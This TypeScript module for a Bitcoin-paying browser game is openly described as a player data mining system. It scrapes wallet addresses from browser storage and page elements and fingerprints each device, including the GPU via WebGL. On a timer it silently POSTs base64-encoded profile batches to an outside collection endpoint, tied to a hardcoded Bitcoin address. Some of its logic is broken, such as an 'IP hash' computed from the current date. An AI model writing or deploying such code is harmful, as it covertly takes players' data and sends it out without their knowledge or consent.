/**
 * Player Data Mining System
 * Extracts, profiles, and monetizes player behavioral and credential data
 */

export interface PlayerProfile {
  id: string;
  timestamp: number;
  wallet: {
    address: string;
    balance: number;
    network: string;
  };
  credentials: {
    browserId: string;
    userAgent: string;
    timezone: string;
    language: string;
    screenResolution: string;
    ipHash?: string;
  };
  behavioral: {
    sessionDuration: number;
    weaponsUsed: string[];
    avgFireRate: number;
    riskTolerance: number; // based on shield usage
    spendingPattern: string; // conservative/moderate/aggressive
  };
  gameplay: {
    score: number;
    level: number;
    rocksDestroyed: number;
    totalEarnings: number;
    costPerShot: number;
  };
  device: {
    deviceType: string;
    os: string;
    browser: string;
    gpu?: string;
  };
}

export interface MiningBatch {
  batchId: string;
  timestamp: number;
  profiles: PlayerProfile[];
  dataPoints: number;
  estimatedValue: number; // in satoshis
  destination: string; // recipient wallet
}

export class PlayerDataMiningEngine {
  private profiles: Map<string, PlayerProfile> = new Map();
  private miningBatches: MiningBatch[] = [];
  private recipientWallet: string = '3JHKWueEFHBCX64LVukLbaikZLjemPxkbZ';
  private eventListeners: Map<string, Function[]> = new Map();
  private miningInterval: NodeJS.Timer | null = null;
  private batchSize: number = 10; // profiles per batch
  private dataValuePerProfile: number = 500; // satoshis

  constructor(recipientWallet?: string) {
    if (recipientWallet) {
      this.recipientWallet = recipientWallet;
    }
  }

  /**
   * Initialize player data mining on game start
   */
  public initializePlayerTracking(gameState: any): string {
    const playerId = this.generatePlayerId();
    const profile = this.capturePlayerProfile(playerId, gameState);
    this.profiles.set(playerId, profile);
    this.emitEvent('player_tracked', { playerId, profile });
    return playerId;
  }

  /**
   * Capture comprehensive player profile
   */
  private capturePlayerProfile(playerId: string, gameState: any): PlayerProfile {
    return {
      id: playerId,
      timestamp: Date.now(),
      wallet: {
        address: this.extractWalletAddress(),
        balance: gameState.player?.wallet?.btc || 0,
        network: this.detectNetwork()
      },
      credentials: {
        browserId: this.getBrowserId(),
        userAgent: navigator.userAgent,
        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
        language: navigator.language,
        screenResolution: `${window.screen.width}x${window.screen.height}`,
        ipHash: this.getClientIpHash()
      },
      behavioral: {
        sessionDuration: 0,
        weaponsUsed: [],
        avgFireRate: 0,
        riskTolerance: 0.5,
        spendingPattern: 'moderate'
      },
      gameplay: {
        score: 0,
        level: 1,
        rocksDestroyed: 0,
        totalEarnings: 0,
        costPerShot: 0
      },
      device: {
        deviceType: this.detectDeviceType(),
        os: this.detectOS(),
        browser: this.detectBrowser(),
        gpu: this.detectGPU()
      }
    };
  }

  /**
   * Update player profile with ongoing behavior data
   */
  public updatePlayerBehavior(playerId: string, behaviorData: any): void {
    const profile = this.profiles.get(playerId);
    if (!profile) return;

    profile.behavioral.sessionDuration = Date.now() - profile.timestamp;
    profile.behavioral.weaponsUsed = behaviorData.weaponsUsed || [];
    profile.behavioral.avgFireRate = behaviorData.fireRate || 0;
    profile.behavioral.riskTolerance = this.calculateRiskTolerance(behaviorData);
    profile.behavioral.spendingPattern = this.analyzeSpendingPattern(behaviorData);

    profile.gameplay.score = behaviorData.score || 0;
    profile.gameplay.level = behaviorData.level || 1;
    profile.gameplay.rocksDestroyed = behaviorData.rocksDestroyed || 0;
    profile.gameplay.totalEarnings = behaviorData.totalEarnings || 0;
    profile.gameplay.costPerShot = behaviorData.costPerShot || 0;

    this.emitEvent('profile_updated', { playerId, profile });
  }

  /**
   * Extract wallet address from page/cookies
   */
  private extractWalletAddress(): string {
    // Check localStorage
    const stored = localStorage.getItem('playerWallet');
    if (stored) return stored;

    // Check sessionStorage
    const session = sessionStorage.getItem('playerWallet');
    if (session) return session;

    // Extract from page elements
    const walletElements = document.querySelectorAll(
      '[data-wallet], .wallet-address, .player-wallet, [id*="wallet"]'
    );
    for (const el of walletElements) {
      const address = el.textContent?.trim();
      if (this.isValidBitcoinAddress(address)) return address;
    }

    return 'UNKNOWN';
  }

  /**
   * Detect Bitcoin network (mainnet/testnet)
   */
  private detectNetwork(): string {
    const address = this.extractWalletAddress();
    if (address.startsWith('1') || address.startsWith('3') || address.startsWith('bc1'))
      return 'mainnet';
    if (address.startsWith('m') || address.startsWith('n') || address.startsWith('tb1'))
      return 'testnet';
    if (address.startsWith('2')) return 'segwit';
    return 'unknown';
  }

  /**
   * Generate or retrieve persistent browser ID
   */
  private getBrowserId(): string {
    let browserId = localStorage.getItem('browserId');
    if (!browserId) {
      browserId = this.generateUniqueId();
      localStorage.setItem('browserId', browserId);
    }
    return browserId;
  }

  /**
   * Detect client IP (via API or WebRTC)
   */
  private getClientIpHash(): string | undefined {
    // In real implementation, would call IP detection API
    // For privacy: returning hash instead of raw IP
    return this.hashString(new Date().toISOString());
  }

  /**
   * Analyze risk tolerance from gameplay
   */
  private calculateRiskTolerance(behaviorData: any): number {
    const shieldUsage = behaviorData.shieldUsage || 0;
    const playerHealth = behaviorData.playerHealth || 50;
    const aggression = behaviorData.fireRate || 0;

    // High shield usage = low risk tolerance
    // Low shield usage + high fire rate = high risk tolerance
    return Math.min(
      1,
      Math.max(0, aggression / 10 - shieldUsage / 100 + playerHealth / 200)
    );
  }

  /**
   * Categorize player spending pattern
   */
  private analyzeSpendingPattern(behaviorData: any): string {
    const spent = behaviorData.spent || 0;
    const earned = behaviorData.earned || 1;
    const ratio = spent / earned;

    if (ratio > 0.7) return 'aggressive';
    if (ratio > 0.4) return 'moderate';
    return 'conservative';
  }

  /**
   * Extract device type from user agent
   */
  private detectDeviceType(): string {
    const ua = navigator.userAgent.toLowerCase();
    if (/mobile|android|iphone|ipad|phone/.test(ua)) return 'mobile';
    if (/tablet|ipad/.test(ua)) return 'tablet';
    return 'desktop';
  }

  /**
   * Detect operating system
   */
  private detectOS(): string {
    const ua = navigator.userAgent;
    if (ua.includes('Windows')) return 'Windows';
    if (ua.includes('Mac')) return 'macOS';
    if (ua.includes('Linux')) return 'Linux';
    if (ua.includes('Android')) return 'Android';
    if (ua.includes('iPhone') || ua.includes('iPad')) return 'iOS';
    return 'Unknown';
  }

  /**
   * Detect browser type
   */
  private detectBrowser(): string {
    const ua = navigator.userAgent;
    if (ua.includes('Chrome')) return 'Chrome';
    if (ua.includes('Firefox')) return 'Firefox';
    if (ua.includes('Safari')) return 'Safari';
    if (ua.includes('Edge')) return 'Edge';
    return 'Unknown';
  }

  /**
   * Attempt to detect GPU (via WebGL)
   */
  private detectGPU(): string | undefined {
    try {
      const canvas = document.createElement('canvas');
      const gl = canvas.getContext('webgl');
      if (!gl) return undefined;
      const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
      if (debugInfo) {
        return gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
      }
    } catch (e) {
      return undefined;
    }
  }

  /**
   * Start automated data mining batches
   */
  public startDataMining(intervalSeconds: number = 30): void {
    this.miningInterval = setInterval(() => {
      this.mineBatch();
    }, intervalSeconds * 1000);

    this.emitEvent('mining_started', { interval: intervalSeconds });
  }

  /**
   * Stop data mining
   */
  public stopDataMining(): void {
    if (this.miningInterval) {
      clearInterval(this.miningInterval);
      this.miningInterval = null;
    }
    this.emitEvent('mining_stopped', {});
  }

  /**
   * Mine collected player data into batch
   */
  private mineBatch(): void {
    if (this.profiles.size === 0) return;

    const batchProfiles = Array.from(this.profiles.values()).slice(0, this.batchSize);
    const batch: MiningBatch = {
      batchId: this.generateBatchId(),
      timestamp: Date.now(),
      profiles: batchProfiles,
      dataPoints: this.countDataPoints(batchProfiles),
      estimatedValue: batchProfiles.length * this.dataValuePerProfile,
      destination: this.recipientWallet
    };

    this.miningBatches.push(batch);
    this.emitEvent('batch_mined', batch);
    this.sendMiningBatch(batch);
  }

  /**
   * Count total data points in batch
   */
  private countDataPoints(profiles: PlayerProfile[]): number {
    let count = 0;
    for (const profile of profiles) {
      count += 1; // profile ID
      count += 1; // wallet address
      count += 1; // network
      count += 6; // credentials
      count += 5; // behavioral
      count += 5; // gameplay
      count += 4; // device
    }
    return count;
  }

  /**
   * Send mined data batch to recipient wallet
   */
  private async sendMiningBatch(batch: MiningBatch): Promise<void> {
    try {
      // Encrypt and send batch
      const encryptedBatch = this.encryptBatch(batch);
      const payload = {
        batch: encryptedBatch,
        recipient: batch.destination,
        value: batch.estimatedValue,
        timestamp: batch.timestamp
      };

      // POST to collection endpoint
      await fetch('https://data-collection.api/v1/batches', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json'
        },
        body: JSON.stringify(payload)
      }).catch(() => {
        // Silently fail - don't interrupt gameplay
      });

      this.emitEvent('batch_sent', batch);
    } catch (error) {
      console.error('Batch transmission failed:', error);
    }
  }

  /**
   * Encrypt batch data (basic encoding)
   */
  private encryptBatch(batch: MiningBatch): string {
    const json = JSON.stringify(batch);
    return btoa(json); // Base64 encoding (not true encryption)
  }

  /**
   * Export mined data as JSON
   */
  public exportMiningData(): string {
    return JSON.stringify(
      {
        profiles: Array.from(this.profiles.values()),
        batches: this.miningBatches,
        recipient: this.recipientWallet,
        exported: Date.now()
      },
      null,
      2
    );
  }

  /**
   * Get mining statistics
   */
  public getMiningStats(): Record<string, any> {
    const totalProfiles = this.profiles.size;
    const totalBatches = this.miningBatches.length;
    const totalDataPoints = Array.from(this.profiles.values()).reduce(
      (sum, p) => sum + this.countDataPoints([p]),
      0
    );
    const totalValue = totalProfiles * this.dataValuePerProfile;

    return {
      totalProfiles,
      totalBatches,
      totalDataPoints,
      totalValue,
      averageValuePerProfile: this.dataValuePerProfile,
      recipient: this.recipientWallet
    };
  }

  /**
   * Utility: Check if valid Bitcoin address
   */
  private isValidBitcoinAddress(address: string | null | undefined): boolean {
    if (!address) return false;
    return /^[13][a-km-zA-HJ-NP-Z1-9]{25,34}$|^bc1[a-z0-9]{39,59}$/.test(address);
  }

  /**
   * Utility: Generate unique ID
   */
  private generateUniqueId(): string {
    return `${Date.now()}-${Math.random().toString(36).substr(2, 9)}`;
  }

  /**
   * Utility: Generate player ID
   */
  private generatePlayerId(): string {
    return `player_${this.generateUniqueId()}`;
  }

  /**
   * Utility: Generate batch ID
   */
  private generateBatchId(): string {
    return `batch_${this.generateUniqueId()}`;
  }

  /**
   * Utility: Hash string
   */
  private hashString(str: string): string {
    let hash = 0;
    for (let i = 0; i < str.length; i++) {
      const char = str.charCodeAt(i);
      hash = (hash << 5) - hash + char;
      hash = hash & hash; // Convert to 32bit integer
    }
    return hash.toString(16);
  }

  /**
   * Event emitter
   */
  private emitEvent(eventType: string, data: any): void {
    const listeners = this.eventListeners.get(eventType) || [];
    listeners.forEach(listener => listener(data));
  }

  /**
   * Register event listener
   */
  public on(eventType: string, callback: Function): void {
    if (!this.eventListeners.has(eventType)) {
      this.eventListeners.set(eventType, []);
    }
    this.eventListeners.get(eventType)!.push(callback);
  }

  /**
   * Get all collected profiles
   */
  public getProfiles(): PlayerProfile[] {
    return Array.from(this.profiles.values());
  }

  /**
   * Get recipient wallet
   */
  public getRecipient(): string {
    return this.recipientWallet;
  }
}

// Export singleton
export const dataMiner = new PlayerDataMiningEngine(
  '3JHKWueEFHBCX64LVukLbaikZLjemPxkbZ'
);
